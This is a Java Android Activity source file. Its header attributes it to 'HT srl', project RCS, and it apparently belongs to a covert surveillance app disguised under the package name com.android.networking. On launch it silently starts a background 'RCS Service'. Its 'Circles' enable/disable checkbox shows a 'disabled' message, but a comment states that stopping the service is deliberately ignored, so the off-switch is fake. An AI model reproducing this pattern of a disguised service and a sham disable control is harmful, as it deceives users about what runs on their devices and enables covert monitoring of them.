/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AndroidServiceGUI.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.gui;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.CheckBox;
import android.widget.Toast;

import com.android.networking.Core;
import com.android.networking.R;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

/**
 * The Class AndroidServiceGUI.
 * http://stackoverflow.com/questions/10909683/launch-android-application-without-main-activity-and-start-service-on-launching
 */
public class AGUI extends Activity {
	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$

	private CheckBox checkBox;

	/**
	 * Called when the activity is first created.
	 * 
	 * @param savedInstanceState
	 *            the saved instance state
	 */
	@Override
	public void onCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		actualCreate(savedInstanceState);
		//Status.self().gui = this;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
		SharedPreferences.Editor editor = preferences.edit();
		editor.putBoolean("enabled", checkBox.isEnabled());
		editor.commit();
		
		//Status.self().gui = null;
	}

	private void actualCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		startService();
		setContentView(R.layout.main);

		// Checkbox listener
		checkBox = (CheckBox) findViewById(R.id.enabled);

		// Retrieve saved status
		SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());

		try {
			checkBox.setChecked(preferences.getBoolean("enabled", false));
		} catch (Exception e) {
			checkBox.setChecked(false);
		}

		checkBox.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
				SharedPreferences.Editor editor = preferences.edit();

				if (checkBox.isChecked()) {
					editor.putBoolean("enabled", true);

					Toast.makeText(AGUI.this, "Circles is now enabled", Toast.LENGTH_LONG).show();
				} else {
					editor.putBoolean("enabled", false);

					// IGNORA LO STOP DEL SERVIZIO
					Toast.makeText(AGUI.this, "Circles is now disabled", Toast.LENGTH_LONG).show();
				}

				editor.commit();
			}
		});
	}
	
	private void startExtService() {
		final String service = "com.android.networking.app"; //$NON-NLS-1$

		try {
			if (Core.isServiceRunning() == false) {
				final ComponentName cn = startService(new Intent(service));
			}
		} catch (final SecurityException se) {

		}
	}

	private void startService() {
		final String service = "com.android.networking.app"; //$NON-NLS-1$
		// final String service = "android.intent.action.MAIN";

		try {
			if (Core.isServiceRunning() == false) {
				final ComponentName cn = startService(new Intent(service));

				if (cn == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
					}
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
					}
				}
			}
		} catch (final SecurityException se) {
			if (Cfg.EXCEPTION) {
				Check.log(se);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
			}
		}
	}

}
